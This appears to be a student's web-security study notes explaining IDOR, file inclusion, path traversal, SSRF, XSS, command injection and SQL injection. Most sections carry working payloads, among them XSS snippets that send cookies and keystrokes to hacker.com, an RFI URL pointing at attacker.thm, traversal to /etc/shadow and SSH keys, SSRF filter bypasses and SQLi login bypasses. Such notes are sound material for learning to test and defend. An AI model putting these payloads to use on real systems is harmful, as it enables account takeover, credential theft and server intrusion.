## IDOR
Insecure Direct Object Reference is a type of access control vulnerability where too much trust is put on the input data from the user so it doesn't get verified by the web server if it should be able to access it.
### Encoded IDs
When passing data from page to page by either a post request, query strings, or cookies, one common tactic is to encode the data. Usually done with base64 encoding (alphanumerical with = at the end).
### Hashed IDs
Although more complicated to deal than encoded, may be more predictable, such as being the hashed version of the integer value. May use md5 hashing and can be dehashed with a lookup table
### The old switcheroo
If the ID cannot be detected using either method, then you can try to create two accounts and swap the ID numbers between them, if you can view one while logged in the other then IDOR vulnerability found
### Endpoints
When ID are not found directly in the search bar they may appear as a type of get request or in a different directory that may be found by digging in

## File Inclusion
Is a type of vulnerability found in many web applications with poorly written PHP (or other programming language) that do not validate or sanitise user input resulting in letting any input pass through a function.
### LFI
Local File Inclusion are a type of vulnerability that arise due to the lack of security awareness from the developer side that exploit the use of functions such as include, require, include_once, require_once.
#### No sanitation at all
When the include command is in use and it throws the input directly into it without assigning a predifined path you can access and display any readable file on the server so basic things like inputting **/etc/passwd** instead of the intended file will work.
#### Predefined path
When using a predifined path we can use ../ to go up a directory and traverse from there.
#### File type
Also the developer can specify the file type to pass to the function in the basic form of **include("INPUT"+''.php")** ensuring that the file to be opened is of the php type. This can be bypassed using the [[Null Byte]] exploit
#### Filtered Keywords
When faced against filtered keywords you can use either a [[Null Byte]] or with a simple **/.** (staying at the same directory) at the end of the path so if they checked for the last file in the path given it will be accepted as it is not one of the filtered words
#### Input validation
When filtering out certain words or texts, for example replacing **../** for a blank space, we can bypass this by sending the following payload **....//** so it will erase the inside ../ and construct the outside part of it while doing so

### RFI
Remote File Inclusion is a technique to include remote files and into a vulnerable application by injecting an external URL into include function. One requirement it has is that the **allow_url_fopen** option need to be on. These vulnerabilities have a higher risk since it allows us to gain Remote Command Execution (RCE) on the server as well as disclosing sensitive info, [XSS](Exploitation#XSS) or [[DoS]]. 

For this you will need to have an already existing command hosted in another URL so you can input it into the include function similar to this **index.php?lang=http://attacker.thm/cmd.txt**

#### RCE
Is one of the most cool ways to gain control into a machine, by injecting code into the request by adding semicolons at the end of the input (PHP), we can then input another command that we want to be executed, basically allowing us to run whatever code we want at runtime (without sanitation of course). ej **index.php?user=admin;phpinfo();**

### Dot Dot slash
Is a vulnerability that allows an attacker to read operating system resources such as local files on the server. You can manipulate the URL to locate and access files or directories stores outside the application's root directory.

A directory traversal or dot dot slash attack can be done when an entry point is found, in some cases **get.php?file=** then you can take advantage of the **../** to move up a directory, going from wherever you were in the application file, one directory higher, possibly reaching root and traversing from there, so a full attack may look like **get.php?file=../../../../etc/passwd**. (literally the same for windows)

Some common OS files to test
#### file paths
|   |   |
|---|---|
|**Location**|**Description**|
|/etc/issue|contains a message or system identification to be printed before the login prompt.|
|/etc/profile|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|/proc/version|specifies the version of the Linux kernel|
|/etc/passwd|has all registered user that has access to a system|
|/etc/shadow|contains information about the system's users' passwords|
|/root/.bash_history|contains the history commands for root user|
|/var/log/dmessage|contains global system messages, including the messages that are logged during system startup|
|/var/mail/root|all emails for root user|
|/root/.ssh/id_rsa|Private SSH keys for a root or any known valid user on the server|
|/var/log/apache2/access.log|the accessed requests for Apache  webserver|
|C:\boot.ini|contains the boot options for computers with BIOS firmware|

## SSRF
Server-Side Request Forgery its a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
### Full control
When the webserver expects us to give them a certain url as a request from them to retreive information and leaves us the whole url to send we can then instead send another request of our liking
expected:
[http://website.com/stock?url=**http://api.website.com/api/stock/item?id=123**] 
given:
[http://website.com/stock?url=**http://apiwebsite.com/api/user**]
### Control over path
Similar to directory traversal we can use ../ to navegate through the path to reach our destination
expected:
[http://website.com/stock?url=**/item?id=123**]
given:
[http://website.com/stock?url=**../user**]
### Control over subdomain
If we only have control over the subdomain request we can append &x= at the end of our request to turn the rest of the original http request into a parameter (?x=) on the query string
expected:
[http://website.com/stock?server=**api**&id=**123**]
given:
[http://website.com/stock?server=**api.website.com/api/user&x=**&id=**123**]
### Redirect request
If we again have control over the full request, we can then instead request access to a server of our choice so we can capture request headers that could contain authentication credentials or API keys sent by the website
expected:
[http://website.com/stock?url=**http://api.website.com/api/stock/item?id=123**] 
given:
[http://website.com/stock?url=**http://hacker-domain.com/**] 
### Common defenses
#### Deny List
A deny list is where all requests are accepted apart from resources specified in a list or that match a particular pattern. Common endpoints to restrict access is the localhost so domain dames sucha as localhost and 127.0.0.1 would appear on a deny list.
A way to bypass this is to use alternative localhost references such as
* 0
* 0.0.0.0
* 0000
* 127.1
* 127.\*.\*.*
* 2130706433
* 017700000001
* Subdomains that have a DNS record which resolves to the IP address such as 127.0.0.1.nip.io
In some cloud environments a common IP to block would be 169.254.169.254 which contains metadata for the deployed server including possibly sensitive information. A way to bypass this is to register a subdomain on our own domain with a DNS record that points to that IP address.
#### Allow list
An allow list is where every request gets denied unless they appear as whitelisted. Such as a rule that an URL must begin with **https://website.com** An attacker could circumvent this rule by creating a subdomain for our own domain such as **https://website.com.attacker.com** thus bypassing that logic.
#### Open redirect
If the above bypasses do not work we can use an open redirect which is an endpoint on the server where the visitor gets redirected to another website address. So for example if we have link like **http://website.com/link?url=http/domain.com** then if we have a rule which only allows URLs beginning with http://website.com/ then we can use the above feature to redirect to another domain of our choice
## XSS
Is an injection attack where malicious JS gets injected into a web application with the intention of being executed by other users.
### Intention
What we wish the JS to actually do.
#### Proof of concept
The most simplest of payloads, used to demonstrate that we can achieve XSS on a website
```js
<script>alert('XSS');</script>
``` 
#### Session stealing
Details of a user's session, such as login tokens are often kept in cookies. The below JavaScript takes the target's cookie, base64 encodes it and then posts it to our own website to be logged.
```js
<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
```
#### Key Logger
Anything that gets typed on the web page will be forwarded under base64 encryption to a website under our control
```js
<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );} </script>
```
#### Business logic
Much more specific than the above examples, can be used to call upon an already existing function, for example, calling a function for changing the user's email address
```js
<script>user.changeEmail('attacker@email.com');</script>
```
### Vulnerabilities
#### Reflected XSS
Happens when user data in an HTTP request is included in the webpage without any validation.
Ej.
If we have a request that looks like this 
`https://website.thm/?error=Invalid Input Detected`
for it to then represent it like this
```js
<div class="alert alert">
	<p>Invalid Input Detected</p>
</div>
```
We could then inject a script
`https://website.thm/?error=<script src="https://hacker.com/evil.js"></script>`
To execute it like this
```js
<div class="alert alert">
	<p><script src="https://hacker.com/evil.js"></script></p>
</div>
```
#### Stored XSS
XSS payload stored on the web application (ej in a database) and then gets run when other users visit the site or web page. One example of this would be a blog website that allows users to post comments but does not check them for java code, so if you include any of it inside the comment, whenever another user loads the comment the code will be executed.
#### DOM Based XSS
Document Object Model is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page us a document that can be either displayed in the browser window or as the HTML source. This exploit happens when the JS execution happens directly in the browser without any new pages being loaded or data submitted to back-end code. An example would be a scenario where the JS gets contents from the window.location.x parameter and then writes it onto the page currently being viewed.
#### Blind XSS
Similar to stored XSS, is when the XSS gets stored in the website but you cannot access it to test it or see it working. An example would be sending a support message to a staff member that only they would be able to check in their own staff portal. A popular tool is [[XSS Hunter Express]]

## Command Injection
Command injection happens whenever applications use functions in programming languages such as PHP, Python, and NodeJS to pass data to make system calls on the machine's operating system. For example taking input from a filed and searching for an entry into a file.
Applications that use user input to populate system commands with data can often be combined with unintended behaviour. Using shell operators **;**, **&**, and **&&** will combine two or more commands and execute them.
### Blind Command Injection
This type of injection is where there is no direct output from the application when testing payloads (unlike Verbose Command Injection). Thus making us investigate the behaviours of the application to determine weather or not the payload was successful.

#### Detecting
For this type of injection we will need to use payloads that will cause some time delay. For example, `ping` and `sleep` commands are significant payloads to test, causing the system to hang for a specified time.

We can also try to force some output, by using redirection operators such as **>**. Making it so we execute the command `whoami` and redirect it to a file, for us to then use `cat` and read the file.

Using `curl` is also a great way to test for command injection, because we can use it to deliver data to and from an application in our payload. 
```bash
curl https://site.com/process.php?search=The Beatles; whoami
|
v
curl https://site.com/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```

### Useful payloads
Linux

|**Payload**|**Description**|
|---|---|
|whoami|See what user the application is running under.|
|ls|List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.|
|ping|This command will invoke the application to hang. This will be useful in testing an application for blind command injection.|
|sleep|This is another useful payload in testing an application for blind command injection, where the machine does not have `ping` installed.|
|nc|[[Netcat]] can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.|

Windows

|**Payload**|**Description**|
|---|---|
|whoami|See what user the application is running under.|
|dir|List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.|
|ping|This command will invoke the application to hang. This will be useful in testing an application for blind command injection.|
|timeout|This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed.|

### Bypassing
Although applications may employ numerous techniques in filtering and sanitising data that is taken from a user's input. These filters will restrict us to certain payloads. However one technique that could be utilised to bypass these filters, is to use the hexadecimal value of characters. So for example
`/etc/passwd` would become `\2xf\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64` 

## SQL Injection
An injection type attack where the web applications uses user-provided data that gets included in a SQL query.
### In-Band
Refers to the same method of communication being used to exploit the vulnerability and also receive the results.

```php
group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'DataBaseName'
```
we gather every table name from the information_schema database which is a database that every user has access to

```php
group_concat(column_name) FROM information_schema.columns WHERE table_name = 'TableName'
```
Similar to the previous one, in this case we will gather every column name from the general database where the table name is the one that we want

### Blind
#### Authentication Bypass
One of the most straightforward  blind injection techniques is when bypassing authentication methods such as login forms. Thanks to the way login forms are often developed, they only care if a matching pair is made between the user and the password in the database, thus returning a True value. We can bypass this by implementing genius level of intellect with `' or 1=1;--` which would always return true

#### Boolean Based
Refers to the response we receive back from our injection attempts, which are a true or false value, although there is not much information we can gather from out attack we can slowly but steadily enumerate the database.
Some things that may help us are 
```php
union select 1,2,3 where database() like 'a%';--
```
which will return append a selection of the number of columns we specify, and then return a true or false value depending on weather or not there is a database that starts with **a**, we can then procede to cycle through the alphabet to get the whole name of the database.
```php
union select 1,2,3 from information_schema.tables where table_schema = 'DataBase' and table_name like 'a%';--
```
similarly we can then use this to get the name of the table with the same procedure. 
```php
union select 1,2,3 from information_schema.columns where table_schema = 'DataBase' and table_name = 'Table' and column_name = 'a%';--
```
And procede with the same to find the column names, one thing to take into account is to append already discovered column names to the payload in order to not keep discovering them. `and column_name !='Column'` 
Finally after finding the database column names we can start to get info from within with the same wildcard
```php
union select 1,2,3 from Table username like '%a';--
```

#### Time Based
Similar to the boolean based, but instead of getting a true or false value, all we get is the time that the request takes for the server to go through, in this case we can use functions like `sleep(1)` which will hang the server for the specified duration, therefore, allowing use to make sure if there was any error or not by looking if the sleep went through.

### Out Of Band

```
admin' union select sleep(0.5),2 from information_schema.tables where table_schema = 'sqli_four' and table_name = '';
```
